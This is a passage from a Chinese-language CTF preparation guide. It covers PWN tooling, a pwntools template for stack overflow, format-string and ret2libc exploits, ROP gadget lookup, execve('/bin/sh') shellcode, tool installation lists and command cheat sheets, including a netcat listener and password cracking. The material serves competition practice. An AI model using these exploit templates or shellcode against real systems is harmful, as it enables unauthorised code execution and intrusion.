readelf -l binary | grep -i stack

# 保护机制含义：
# NX (No Execute)     栈不可执行，无法在栈上运行 shellcode
# PIE (Position Independent)  地址随机化
# Canary              栈保护，函数返回前检查金丝雀值
# RELRO               GOT 表只读 (Full RELRO 更强)
# ASLR (系统级)       地址空间布局随机化
```

---

## 五、PWN 方向

### 5.1 工具清单

| 工具 | 用途 | 一句话用法 | GitHub 地址 |
|------|------|-----------|-------------|
| pwntools | Python PWN 框架 | `from pwn import *` | https://github.com/Gallopsled/pwntools |
| GDB + pwndbg | 动态调试 | `gdb ./binary` | https://github.com/pwndbg/pwndbg |
| ROPgadget | ROP gadget 查找 | `ROPgadget --binary binary` | https://github.com/JonathanSalwan/ROPgadget |
| ropper | ROP gadget 查找 | `ropper --file binary` | https://github.com/sashs/Ropper |
| one_gadget | execve gadget 查找 | `one_gadget libc.so` | https://github.com/david942j/one_gadget |
| seccomp-tools | 沙箱规则分析 | `seccomp-tools dump ./binary` | https://github.com/david942j/seccomp-tools |
| patchelf | 修改 ELF | `patchelf --set-interpreter ./ld binary` | https://github.com/NixOS/patchelf |
| libc-database | libc 版本识别 | 在线或本地查 libc 版本 | https://github.com/niklasb/libc-database |

### 5.2 pwntools 基础模板

```python
#!/usr/bin/env python3
"""
pwntools 基础 PWN 模板
覆盖栈溢出、格式化字符串、ret2libc 等常见题型
"""

from pwn import *

# ========== 配置 ==========
context.arch = 'amd64'   # 或 'i386'
context.log_level = 'debug'

# 连接方式
# LOCAL = 远程 False, 本地 True
LOCAL = True
BINARY = './pwn'
HOST = 'challenge.ctf.com'
PORT = 9999

if LOCAL:
    p = process(BINARY)
    # gdb.attach(p, 'b *0x401234')  # 附加 GDB
else:
    p = remote(HOST, PORT)

elf = ELF(BINARY)


# ========== 辅助函数 ==========
def sla(data, line):
    p.sendlineafter(data, line)

def sa(data, payload):
    p.sendafter(data, payload)


# ========== 栈溢出模板 ==========
def stack_overflow():
    """栈溢出，覆盖返回地址"""
    offset = 72  # 通过 cyclic 或手动计算

    # ret2win：跳转到后门函数
    # win_addr = elf.symbols['win']
    # payload = b'A' * offset + p64(win_addr)

    # ROP chain
    # pop_rdi = 0x401233  # ROPgadget 找到
    # bin_sh = next(elf.search(b'/bin/sh'))
    # system = elf.plt['system']
    # payload = b'A' * offset + p64(pop_rdi) + p64(bin_sh) + p64(system)

    payload = b'A' * offset + p64(0)  # 替换为实际目标
    p.sendline(payload)
    p.interactive()


# ========== 格式化字符串模板 ==========
def format_string():
    """格式化字符串漏洞利用"""
    # 任意地址写：用 %n 写入值
    # 目标：将 target_var 的值改为 0x12345678

    # 方法1：直接写（小端序）
    # target_addr = 0x601040
    # payload = p64(target_addr) + b'%12$n'  # 偏移需调试确定

    # 方法2：pwntools fmtstr_payload
    from pwn import fmtstr_payload
    target_addr = 0x601040
    target_value = 0x12345678
    # offset: 格式化字符串在栈上的偏移
    payload = fmtstr_payload(6, {target_addr: target_value})
    p.sendline(payload)
    p.interactive()


# ========== ret2libc 模板 ==========
def ret2libc():
    """ret2libc：泄露 libc 地址后调用 system"""
    # 第一步：泄露 libc 中函数的地址
    put_got = elf.got['puts']
    put_plt = elf.plt['puts']
    main_addr = elf.symbols['main']
    pop_rdi = 0x401233  # ROPgadget --binary pwn | grep "pop rdi"

    # 泄露 puts@got
    payload = b'A' * 72
    payload += p64(pop_rdi) + p64(put_got)
    payload += p64(put_plt)
    payload += p64(main_addr)  # 返回 main 再打一次

    p.sendline(payload)
    p.recvuntil('\n')

    puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
    log.info(f"puts @ {hex(puts_addr)}")

    # 第二步：计算 libc 基址
    libc = ELF('./libc.so.6')  # 需要对应的 libc
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh = libc_base + next(libc.search(b'/bin/sh'))

    log.info(f"libc base @ {hex(libc_base)}")
    log.info(f"system @ {hex(system_addr)}")

    # 第三步：再次溢出调用 system("/bin/sh")
    payload2 = b'A' * 72
    payload2 += p64(pop_rdi) + p64(bin_sh)
    payload2 += p64(system_addr)

    p.sendline(payload2)
    p.interactive()


# ========== 运行 ==========
if __name__ == "__main__":
    # 取消注释选择对应模板
    # stack_overflow()
    # format_string()
    # ret2libc()
    p.interactive()
```

### 5.3 ROP chain 构造

```bash
# 查找 ROP gadget
ROPgadget --binary pwn | grep "pop rdi"
ROPgadget --binary pwn | grep "ret"
ROPgadget --binary pwn --rop   # 自动生成 ROP chain

# 查找 one_gadget (libc 中直接 getshell 的 gadget)
one_gadget libc.so.6
# 输出示例：
# 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
# constraints:
#   rcx == NULL
# 选择满足约束的 gadget，配合溢出使用
```

### 5.4 shellcode 生成

```python
#!/usr/bin/env python3
"""
shellcode 生成与测试
"""

from pwn import *

context.arch = 'amd64'  # 或 'i386', 'arm'

# 方法1：pwntools 内置 shellcode
# execve("/bin/sh")
sc = asm(shellcraft.sh())
print(f"shellcode ({len(sc)} bytes): {sc.hex()}")

# 方法2：自定义
# amd64 execve("/bin/sh") 手写版
shellcode_amd64 = """
xor rsi, rsi
xor rdx, rdx
mov rdi, 0x68732f6e69622f  /* "/bin/sh" */
push rdi
mov rdi, rsp
mov al, 59    /* execve syscall */
syscall
"""

# 方法3：从 shell-storm.org 等获取
# http://shell-storm.org/shellcode/

# 测试 shellcode
def test_shellcode(sc):
    """在沙箱中测试 shellcode"""
    p = process('./sc_test')  # 需要一个读取并执行 shellcode 的程序
    p.send(sc)
    p.interactive()
```

---

## 六、赛前准备清单

> 参赛前一周完成本章节所有安装和脚本准备，比赛当天直接用。

### 6.1 系统环境

推荐 Kali Linux 或 Ubuntu 22.04，虚拟机分配至少 4GB 内存 + 50GB 磁盘。

```bash
# 基础环境
sudo apt update && sudo apt upgrade -y
sudo apt install -y git curl wget vim python3 python3-pip \
    build-essential libssl-dev libffi-dev ruby-dev \
    gdb gdb-multiarch file xxd strings

# Python 虚拟环境（避免污染系统）
pip3 install virtualenv
mkdir -p ~/ctf && cd ~/ctf
virtualenv venv && source venv/bin/activate
```

### 6.2 必装工具清单（按方向）

#### Web 方向

```bash
# Kali 自带的不再列出，以下为补充
sudo apt install -y sqlmap dirsearch hydra nmap

# gobuster
sudo apt install -y gobuster

# dirsearch（如 apt 没有）
git clone https://github.com/maurosoria/dirsearch.git ~/ctf/tools/dirsearch

# Burp Suite 社区版：官网下载 jar
# https://portswigger.net/burp/communitydownload

# AntSword 蚁剑
git clone https://github.com/AntSwordProject/antSword.git ~/ctf/tools/antSword

# 字典文件
sudo apt install -y seclists wordlists
ls /usr/share/seclists/Discovery/Web-Content/
ls /usr/share/wordlists/
```

#### Misc 方向

```bash
sudo apt install -y binwalk foremost exiftool steghide \
    fcrackzip john hashcat wireshark audacity \
    pngcheck zlib1g-dev

# zsteg（Ruby）
sudo gem install zsteg

# StegSolve（Java）
wget http://www.caesum.com/handbook/Stegsolve.jar -O ~/ctf/tools/Stegsolve.jar

# CyberChef 离线版
git clone https://github.com/gchq/CyberChef.git ~/ctf/tools/CyberChef

# outguess（JPEG 隐写）
sudo apt install -y outguess

# stegseek（steghide 加速破解）
sudo apt install -y stegseek
```

#### Crypto 方向

```bash
# Python 密码学库
pip3 install pycryptodome gmpy2 sympy

# SageMath（数论利器，体积大，提前装）
sudo apt install -y sagemath

# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git ~/ctf/tools/RsaCtfTool
cd ~/ctf/tools/RsaCtfTool && pip3 install -r requirements.txt

# yafu（大数分解）
sudo apt install -y yafu

# hashpump（哈希长度扩展攻击）
git clone https://github.com/bwall/HashPump.git ~/ctf/tools/HashPump
cd ~/ctf/tools/HashPump && g++ *.cpp -o hashpump -lssl -lcrypto

# xortool
pip3 install xortool

# factordb 客户端
pip3 install factordb-python
```

#### Reverse 方向

```bash
# Ghidra（开源 IDA 替代）
wget https://github.com/NationalSecurityAgency/ghidra/releases/latest -O ~/ctf/tools/ghidra.zip
unzip ~/ctf/tools/ghidra.zip -d ~/ctf/tools/

# radare2
git clone https://github.com/radareorg/radare2.git ~/ctf/tools/radare2
cd ~/ctf/tools/radare2 && sys/install.sh

# z3 约束求解
pip3 install z3-solver

# angr 符号执行
pip3 install angr

# apktool / jadx（Android 逆向）
sudo apt install -y apktool default-jdk
git clone https://github.com/skylot/jadx.git ~/ctf/tools/jadx
cd ~/ctf/tools/jadx && ./gradlew dist

# Java 环境解包
sudo apt install -y procyon-decompiler
```

#### PWN 方向

```bash
# pwntools
pip3 install pwntools

# GDB 插件 pwndbg
git clone https://github.com/pwndbg/pwndbg.git ~/ctf/tools/pwndbg
cd ~/ctf/tools/pwndbg && ./setup.sh

# ROPgadget / ropper
pip3 install ROPgadget ropper

# one_gadget（Ruby）
sudo gem install one_gadget

# seccomp-tools（Ruby）
sudo gem install seccomp-tools

# patchelf（修改 ELF 依赖）
sudo apt install -y patchelf

# pwninit（PWN 题目自动初始化）
cargo install pwninit   # 需要 Rust
# 或 pip3 install pwninit

# libc-database（本地 libc 查询）
git clone https://github.com/niklasb/libc-database.git ~/ctf/tools/libc-database
cd ~/ctf/tools/libc-database && ./download.sh
# 在线版替代：https://libc.rip/ 或 https://libc.blukat.me/
```

### 6.3 必备脚本清单

> 以下脚本位于 `cyber_security/ctf_scripts/` 目录，赛前确认可运行。

| 脚本 | 路径 | 用途 | 赛前检查 |
|------|------|------|----------|
| sql_blind.py | ctf_scripts/sql_blind.py | SQL 布尔盲注二分法自动化 | `python3 sql_blind.py --help` |
| decode_all.py | ctf_scripts/decode_all.py | 编码批量自动识别解码 | `python3 decode_all.py "dGVzdA=="` |
| file_id.py | ctf_scripts/file_id.py | 文件魔数识别真实类型 | `python3 file_id.py test.png` |
| zip_fake_encrypt.py | ctf_scripts/zip_fake_encrypt.py | ZIP 伪加密检测与修复 | `python3 zip_fake_encrypt.py test.zip` |
| classic_crypto.py | ctf_scripts/classic_crypto.py | 古典密码批量解密 | `python3 classic_crypto.py caesar "test"` |
| rsa_attacks.py | ctf_scripts/rsa_attacks.py | RSA 攻击集合 | `python3 rsa_attacks.py --help` |
| pwn_template.py | ctf_scripts/pwn_template.py | pwntools PWN 模板 | 检查模板中的 remote/process 切换 |
| xor_tool.py | ctf_scripts/xor_tool.py | XOR 加解密与爆破 | `python3 xor_tool.py auto "cipher.txt"` |

```bash
# 赛前一键测试所有脚本
cd ~/ai_blog/cyber_security/ctf_scripts/
for script in *.py; do
    echo "===== $script ====="
    python3 "$script" --help 2>&1 | head -5
    echo
done
```

### 6.4 必备模板文件

赛前在 `~/ctf/templates/` 准备以下模板，比赛时复制即用。

#### 6.4.1 PWN exp 模板

```python
#!/usr/bin/env python3
# ~/ctf/templates/pwn_exp.py
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

# ===== 模式切换 =====
# 本地:  python3 exp.py
# 远程:  python3 exp.py REMOTE <ip> <port>
# GDB:   python3 exp.py GDB
def start():
    if args.GDB:
        return gdb.debug('./pwn', gdbscript='''
            b main
            continue
        ''')
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process('./pwn')

io = start()
elf = ELF('./pwn')
# libc = ELF('./libc.so.6')

# ===== 求偏移 =====
# io.sendline(cyclic(500))
# crash 后用 cyclic_find(corefile.pc) 或 cyclic_find(corefile.read(sp, 4))

# ===== 构造 payload =====
# payload = b'A' * offset + p64(ret_addr)
# io.sendline(payload)

io.interactive()
```

#### 6.4.2 Web 请求模板

```python
#!/usr/bin/env python3
# ~/ctf/templates/web_req.py
import requests

url = "http://target.com/"
headers = {"User-Agent": "Mozilla/5.0"}
cookies = {"session": "xxx"}

# 基础请求
r = requests.get(url, headers=headers, cookies=cookies, timeout=10)
print(r.status_code, r.text[:500])

# POST 请求
# r = requests.post(url, data={"key": "value"}, headers=headers)

# 带代理（配合 Burp）
# proxies = {"http": "http://127.0.0.1:8080"}
# r = requests.get(url, proxies=proxies, verify=False)
```

#### 6.4.3 编解码工具箱模板

```python
#!/usr/bin/env python3
# ~/ctf/templates/codec.py
import base64, binascii, urllib.parse, codecs

def try_decode(s):
    """自动尝试多种解码"""
    results = []
    try: results.append(("base64", base64.b64decode(s).decode(errors='ignore')))
    except: pass
    try: results.append(("base32", base64.b32decode(s).decode(errors='ignore')))
    except: pass
    try: results.append(("hex", bytes.fromhex(s).decode(errors='ignore')))
    except: pass
    try: results.append(("url", urllib.parse.unquote(s)))
    except: pass
    try: results.append(("rot13", codecs.decode(s, 'rot_13')))
    except: pass
    return results

if __name__ == "__main__":
    import sys
    s = sys.argv[1] if len(sys.argv) > 1 else input("输入: ")
    for name, result in try_decode(s):
        if result and result != s:
            print(f"[{name}] {result}")
```

### 6.5 赛前检查清单

比赛前一天逐项确认：

```
[ ] 虚拟机快照已保存（随时可回滚）
[ ] Python 虚拟环境可用，pwntools 导入正常
[ ] Burp Suite 证书已安装，代理可抓包
[ ] GDB + pwndbg 启动正常（gdb ./test 能看寄存器）
[ ] ROPgadget / one_gadget 命令可用
[ ] binwalk -e / foremost 可提取文件
[ ] zsteg / stegsolve 可打开图片
[ ] Wireshark 可打开 pcap，过滤规则正常
[ ] SageMath 可启动（sage 命令）
[ ] RsaCtfTool 可运行（python3 RsaCtfTool.py -h）
[ ] dirsearch / gobuster 字典文件就位
[ ] ctf_scripts/ 下所有脚本 --help 正常
[ ] ~/ctf/templates/ 模板文件就绪
[ ] 网络稳定，VPN/代理配置好
[ ] 浏览器书签：CTF Wiki / CyberChef / factordb / libc.rip
[ ] 记事本工具就绪（Obsidian / Typora）用于记录 Writeup
[ ] 团队协作工具就绪（如多人参赛）
[ ] 常用 payload 字典就绪（flag 格式、SQL 注入、XSS、SSTI）
```

### 6.6 浏览器书签准备

赛前在浏览器收藏以下在线工具：

```
分类          网址                              用途
CTF Wiki     https://ctf-wiki.org/             知识查阅
CyberChef    https://gchq.github.io/CyberChef/ 编解码瑞士军刀
factordb     https://factordb.com/             在线因数分解
libc.rip     https://libc.rip/                 libc 版本查询
libc.blukat  https://libc.blukat.me/           libc 函数偏移查询
quipqiup     https://www.quipqiup.com/         替换密码自动破解
dcode        https://www.dcode.fr/             各种密码/编码识别
myjson       https://jwt.io/                   JWT 解码
ASCII表      https://www.asciitable.com/       ASCII 对照
URL编码      https://www.urlencoder.org/       URL 编解码
Base64       https://www.base64decode.org/     Base64 编解码
正则可视化    https://regex101.com/             正则测试
```

### 6.7 团队分工模板（如多人参赛）

```
方向          负责人    主要工具
Web           A        Burp Suite, sqlmap, dirsearch
Misc          B        Wireshark, binwalk, StegSolve
Crypto        C        SageMath, RsaCtfTool, CyberChef
Reverse/PWN   D        IDA/Ghidra, pwntools, GDB
通用支持      E        搜索资料、整理 Writeup、提交 Flag
```

---

## 七、通用工具与技巧

### 7.1 Python 快捷操作

```python
# bytes ↔ int
b'\x12\x34' → int.from_bytes(b'\x12\x34', 'big')  # 0x1234
0x1234 → 0x1234.to_bytes(2, 'big')                  # b'\x12\x34'

# bytes ↔ hex string
b'\xde\xad' → b'\xde\xad'.hex()      # 'dead'
'dead' → bytes.fromhex('dead')         # b'\xde\xad'

# bytes ↔ base64
import base64
b'hello' → base64.b64encode(b'hello')  # b'aGVsbG8='
b'aGVsbG8=' → base64.b64decode(b'aGVsbG8=')  # b'hello'

# XOR
def xor(data, key):
    return bytes(a ^ b for a, b in zip(data, key * (len(data) // len(key) + 1)))

# pwntools 常用
from pwn import *
p64(0x41414141)   # 打包为 8 字节小端序
u64(b'\x41\x41\x41\x41\x00\x00\x00\x00')  # 解包
p32(0x41414141)   # 打包为 4 字节
```

### 7.2 一行命令速查

```bash
# 编解码
echo -n "hello" | base64              # Base64 编码
echo "aGVsbG8=" | base64 -d           # Base64 解码
echo -n "hello" | xxd -p              # 转 Hex
echo "68656c6c6f" | xxd -r -p         # Hex 转字符串
echo -n "hello" | md5sum              # MD5
echo -n "hello" | sha256sum           # SHA256

# 文件操作
xxd file | head -20                   # 十六进制查看
strings file | grep -i flag           # 提取含 flag 的字符串
file file                             # 文件类型
binwalk -e file                       # 提取隐藏文件
foremost -i file -o output/           # 文件恢复

# 网络操作
nc -lvnp 4444                         # 监听端口
nc target 4444                        # 连接目标
curl http://target/flag               # HTTP 请求
nmap -sV -p 1-65535 target           # 端口扫描

# Python 一行
python3 -c "import base64; print(base64.b64decode('aGVsbG8=').decode())"
python3 -c "print(bytes.fromhex('68656c6c6f').decode())"
python3 -c "from pwn import *; print(p64(0x41414141))"

# 密码破解
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### 7.3 环境快速部署

```bash
# Kali Linux 基础工具安装
sudo apt update && sudo apt install -y \
    gdb gdb-multiarch \
    python3-pip \
    binwalk foremost \
    wireshark \
    hashcat john \
    nmap \
    sqlmap \
    hydra \
    fcrackzip \
    exiftool

# Python PWN 工具
pip3 install pwntools z3-solver angr gmpy2 pycryptodome

# ROPgadget
pip3 install ROPgadget

# seccomp-tools
gem install seccomp-tools

# zsteg (PNG 隐写)
gem install zsteg

# RsaCtfTool
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool && pip3 install -r requirements.txt
```
